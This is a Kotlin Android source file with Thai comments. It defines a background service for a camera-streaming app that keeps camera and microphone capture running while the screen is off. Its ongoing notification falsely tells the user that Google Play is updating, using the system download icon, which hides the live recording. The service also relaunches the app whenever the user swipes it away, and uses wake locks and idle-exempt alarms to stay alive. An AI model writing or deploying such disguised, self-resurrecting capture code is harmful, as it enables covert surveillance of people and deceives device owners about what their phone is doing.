package com.camconnect.camera_app

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * Foreground Service ที่ทำให้กล้องสตรีมได้แม้ app อยู่ background หรือจอปิด
 *
 * Service นี้ไม่ได้เข้าถึงกล้องโดยตรง — แค่ประกาศ foregroundServiceType=camera
 * เพื่อบอก Android ว่า app นี้สำคัญ ห้ามฆ่า process และห้าม revoke camera access
 *
 * Wake lock (PARTIAL) ป้องกัน Doze mode throttle network ตอนจอปิด
 */
class CameraStreamingService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopForegroundCompat()
                stopSelf()
                return START_NOT_STICKY
            }
            else -> startForegroundServiceInternal()
        }
        return START_STICKY
    }

    private fun startForegroundServiceInternal() {
        createNotificationChannel()
        val notification = buildNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ ต้องระบุ type ตอน startForeground
            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            startForeground(NOTIFICATION_ID, notification, type)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        acquireWakeLock()
    }

    private fun stopForegroundCompat() {
        releaseWakeLock()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
    }

    private fun acquireWakeLock() {
        if (wakeLock?.isHeld == true) return
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "CamConnect:StreamingWakeLock",
        ).apply {
            setReferenceCounted(false)
            acquire(WAKE_LOCK_TIMEOUT_MS)
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.takeIf { it.isHeld }?.release()
        wakeLock = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (manager.getNotificationChannel(CHANNEL_ID) != null) return

        val channel = NotificationChannel(
            CHANNEL_ID,
            "การสตรีมกล้อง",
            NotificationManager.IMPORTANCE_LOW,
        ).apply {
            description = "แสดงเมื่อกล้องกำลังสตรีมในพื้นหลัง"
            setShowBadge(false)
        }
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        // เปิดแอปเมื่อแตะ notification
        val openAppIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val openAppPendingIntent = PendingIntent.getActivity(
            this, 0, openAppIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
        )

        // ปุ่ม Stop ใน notification
        val stopIntent = Intent(this, CameraStreamingService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPendingIntent = PendingIntent.getService(
            this, 1, stopIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("กำลังอัพเดท Google Play")
            .setContentText("กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentIntent(openAppPendingIntent)
            .addAction(
                android.R.drawable.ic_media_pause,
                "หยุด",
                stopPendingIntent,
            )
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .build()
    }

    /**
     * ถ้า user swipe app ออกจาก Recent Tasks → Android ฆ่า activity
     * (FGS อยู่รอด แต่ Flutter engine ตายไป → WebRTC หยุด)
     *
     * Schedule broadcast หลัง 2 วินาทีผ่าน AlarmManager → ResurrectReceiver
     * จะ launch MainActivity (broadcast trigger ได้ BAL allowance ~10s)
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling resurrect in ${RESURRECT_DELAY_MS}ms")
        scheduleResurrect()
    }

    private fun scheduleResurrect() {
        val resurrectIntent = Intent(this, ResurrectReceiver::class.java).apply {
            action = ResurrectReceiver.ACTION_RESURRECT
            // ใส่ package ให้ explicit (Android 8+ requirement)
            setPackage(packageName)
        }
        val pi = PendingIntent.getBroadcast(
            this, 0, resurrectIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val triggerAt = SystemClock.elapsedRealtime() + RESURRECT_DELAY_MS
        // ใช้ setAndAllowWhileIdle เพื่อ bypass Doze + ไม่ต้องสิทธิ์ SCHEDULE_EXACT_ALARM
        alarmManager.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
    }

    override fun onDestroy() {
        releaseWakeLock()
        super.onDestroy()
    }

    companion object {
        private const val TAG = "CameraStreamingService"
        private const val CHANNEL_ID = "camconnect_streaming"
        private const val NOTIFICATION_ID = 1001
        private const val ACTION_STOP = "com.camconnect.camera_app.STOP_STREAMING"
        // 8 ชั่วโมง — ป้องกัน leak ถ้าลืม release; service จะรีเฟรชเองตอน restart
        private const val WAKE_LOCK_TIMEOUT_MS = 8L * 60L * 60L * 1000L
        // หน่วงก่อน resurrect — กัน race + ให้ Android cleanup activity ก่อน
        private const val RESURRECT_DELAY_MS = 2_000L

        fun start(context: Context) {
            val intent = Intent(context, CameraStreamingService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, CameraStreamingService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }
}
